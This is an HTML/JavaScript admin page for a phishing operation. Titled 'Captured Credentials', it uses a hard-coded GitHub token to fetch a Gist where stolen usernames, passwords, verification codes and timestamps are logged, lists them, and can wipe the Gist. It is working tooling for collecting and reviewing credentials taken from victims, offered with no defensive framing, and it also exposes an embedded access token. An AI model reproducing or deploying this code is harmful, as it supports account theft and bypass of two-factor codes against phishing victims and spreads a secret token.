<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Credentials</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        .credential {
            border: 1px solid #ddd;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        .credential p {
            margin: 5px 0;
        }
        .credential strong {
            color: #333;
        }
        .no-credentials {
            text-align: center;
            color: #666;
            padding: 20px;
        }
        .refresh-btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            margin-right: 10px;
        }
        .refresh-btn:hover {
            background-color: #45a049;
        }
        .header-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .credential-count {
            color: #666;
            font-size: 14px;
        }
        .clear-btn {
            background-color: #d9534f;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
        }
        .clear-btn:hover {
            background-color: #c9302c;
        }
        .error-message {
            color: #d9534f;
            background-color: #f9f2f4;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
            border: 1px solid #d9534f;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Captured Credentials</h1>
    <div class="header-actions">
        <div class="credential-count" id="credentialCount">Loading...</div>
        <div>
            <button class="refresh-btn" onclick="loadCredentials()">Refresh</button>
            <button class="clear-btn" onclick="clearCredentials()">Clear All</button>
        </div>
    </div>
    <div id="credentials"></div>
</div>

<script>
    // GitHub configuration
    const GITHUB_TOKEN = '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';
    const GIST_ID = '1f7466c2dfe70a7c9af4e2ca65a6d9fe';
    
    // Load credentials when the page loads
    window.onload = function() {
        loadCredentials();
    };
    
    function loadCredentials() {
        const container = document.getElementById('credentials');
        const countElement = document.getElementById('credentialCount');
        
        container.innerHTML = '<div class="no-credentials">Loading credentials...</div>';
        
        // Fetch the Gist content
        fetch(`https://api.github.com/gists/${GIST_ID}`, {
            headers: {
                'Authorization': `token ${GITHUB_TOKEN}`
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            // Get the filename and content
            const filename = Object.keys(data.files)[0];
            const content = data.files[filename].content;
            
            // Parse the content into credential entries
            const lines = content.split('\n').filter(line => line.trim());
            
            // Update count
            countElement.textContent = `${lines.length} credential(s) captured`;
            
            if (lines.length === 0 || (lines.length === 1 && lines[0] === "Initial content")) {
                container.innerHTML = '<div class="no-credentials">No credentials captured yet.</div>';
                return;
            }
            
            container.innerHTML = '';
            
            // Display each credential in reverse order (newest first)
            lines.reverse().forEach((line, index) => {
                // Skip the initial content line
                if (line === "Initial content") return;
                
                const credential = document.createElement('div');
                credential.className = 'credential';
                
                // Parse the credential line
                const parts = line.split(', ');
                let username = '';
                let password = '';
                let verification = '';
                let timestamp = '';
                
                parts.forEach(part => {
                    if (part.startsWith('Username:')) {
                        username = part.substring(10);
                    } else if (part.startsWith('Password:')) {
                        password = part.substring(10);
                    } else if (part.startsWith('Verification:')) {
                        verification = part.substring(13);
                    } else if (part.startsWith('Time:')) {
                        timestamp = part.substring(6);
                    }
                });
                
                // Format the timestamp for better readability
                let formattedTime = timestamp;
                try {
                    const date = new Date(timestamp);
                    formattedTime = date.toLocaleString();
                } catch (e) {
                    // Keep original if parsing fails
                }
                
                // Build the HTML content
                let htmlContent = `
                    <p><strong>Username:</strong> ${username}</p>
                    <p><strong>Password:</strong> ${password}</p>
                `;
                
                // Add verification code if it exists
                if (verification) {
                    htmlContent += `<p><strong>Verification Code:</strong> ${verification}</p>`;
                }
                
                // Add timestamp
                htmlContent += `<p><strong>Time:</strong> ${formattedTime}</p>`;
                
                credential.innerHTML = htmlContent;
                container.appendChild(credential);
            });
        })
        .catch(error => {
            console.error('Error loading credentials:', error);
            container.innerHTML = `<div class="error-message">Error loading credentials: ${error.message}</div>`;
            countElement.textContent = 'Error';
        });
    }
    
    function clearCredentials() {
        if (confirm('Are you sure you want to clear all credentials? This action cannot be undone.')) {
            // First, get the current content of the Gist
            fetch(`https://api.github.com/gists/${GIST_ID}`, {
                headers: {
                    'Authorization': `token ${GITHUB_TOKEN}`
                }
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                // Get the filename
                const filename = Object.keys(data.files)[0];
                
                // Reset the content to just the initial content
                return fetch(`https://api.github.com/gists/${GIST_ID}`, {
                    method: 'PATCH',
                    headers: {
                        'Authorization': `token ${GITHUB_TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        files: {
                            [filename]: {
                                content: "Initial content"
                            }
                        }
                    })
                });
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                console.log('Credentials cleared from Gist');
                loadCredentials();
            })
            .catch(error => {
                console.error('Error clearing credentials:', error);
                alert('Error clearing credentials: ' + error.message);
            });
        }
    }
</script>

</body>
</html>
